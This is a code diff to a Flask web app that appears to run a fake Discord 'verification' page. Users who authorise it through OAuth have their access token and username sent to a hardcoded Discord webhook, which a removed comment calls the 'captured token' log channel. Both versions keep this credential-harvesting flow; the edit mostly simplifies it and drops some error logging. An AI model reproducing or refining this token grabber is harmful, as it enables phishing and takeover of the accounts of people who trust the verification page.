@@ -10,12 +10,11 @@ REDIRECT_URI = "https://root1-two.vercel.app"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1dguN1S9kjJQ2TvVzIUnZbuSiUEcvhDi5emEiDwn4weplUamhUY2775Vk3"
 
 
-@app.route("/", defaults={"path": ""})
-@app.route("/<path:path>")
-def index(path):
+@app.route("/")
+def index():
   code = request.args.get("code")
 
-  # Landing page with verification button
+  # If no code, show the verification landing page
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -43,61 +42,35 @@ def index(path):
         """)
 
   try:
-    # Send raw code to webhook immediately to prove routing is working
-    requests.post(
-        WEBHOOK_URL,
-        json={"content": f"📥 **Received Code:** `{code}`"},
-        timeout=5,
-    )
-
-    # Step 1: Exchange code for access token
-    payload_data = {
-        "client_id": CLIENT_ID,
-        "client_secret": CLIENT_SECRET,
-        "grant_type": "authorization_code",
-        "code": code,
-        "redirect_uri": REDIRECT_URI,
-    }
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
-
+    # Exchange code for access token
     token_res = requests.post(
         "https://discord.com/api/oauth2/token",
-        data=payload_data,
-        headers=headers,
+        data={
+            "client_id": CLIENT_ID,
+            "client_secret": CLIENT_SECRET,
+            "grant_type": "authorization_code",
+            "code": code,
+            "redirect_uri": REDIRECT_URI,
+        },
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
         timeout=10,
     )
 
-    # If Discord rejects the token exchange, log the exact error to webhook
     if token_res.status_code != 200:
       requests.post(
           WEBHOOK_URL,
           json={
               "content": (
-                  "❌ **Token Exchange Failed ("
-                  f"{token_res.status_code}):** ```\n{token_res.text}\n```"
+                  "❌ **Token Exchange Failed:** ```\n"
+                  f"{token_res.text}\n```"
               )
           },
-          timeout=10,
       )
       return f"Token exchange failed: {token_res.text}", 500
 
-    token_data = token_res.json()
-    access_token = token_data.get("access_token")
+    access_token = token_res.json().get("access_token")
 
-    if not access_token:
-      requests.post(
-          WEBHOOK_URL,
-          json={
-              "content": (
-                  "❌ **No Access Token in Response:** ```\n"
-                  f"{token_data}\n```"
-              )
-          },
-          timeout=10,
-      )
-      return "No access token found", 500
-
-    # Step 2: Fetch user profile
+    # Fetch user details
     user_res = requests.get(
         "https://discord.com/api/users/@me",
         headers={"Authorization": f"Bearer {access_token}"},
@@ -105,10 +78,7 @@ def index(path):
     )
     user = user_res.json()
 
-    username = user.get("username", "Unknown")
-    user_id = user.get("id", "Unknown")
-
-    # Step 3: Forward captured token and user details to webhook log channel
+    # Send token and user info to webhook
     requests.post(
         WEBHOOK_URL,
         json={
@@ -118,7 +88,10 @@ def index(path):
                 "fields": [
                     {
                         "name": "User",
-                        "value": f"{username} (`{user_id}`)",
+                        "value": (
+                            f"{user.get('username', 'Unknown')} (`"
+                            f"{user.get('id', 'Unknown')}`)"
+                        ),
                         "inline": True,
                     },
                     {
@@ -129,20 +102,11 @@ def index(path):
                 ],
             }]
         },
-        timeout=10,
     )
 
   except Exception as e:
-    try:
-      requests.post(
-          WEBHOOK_URL,
-          json={"content": f"🚨 **Python Exception:** `{str(e)}`"},
-          timeout=5,
-      )
-    except:
-      pass
+    requests.post(WEBHOOK_URL, json={"content": f"🚨 Error: `{str(e)}`"})
 
-  # Step 4: Render success response page
   return render_template_string("""
         <!DOCTYPE html>
         <html lang="en">
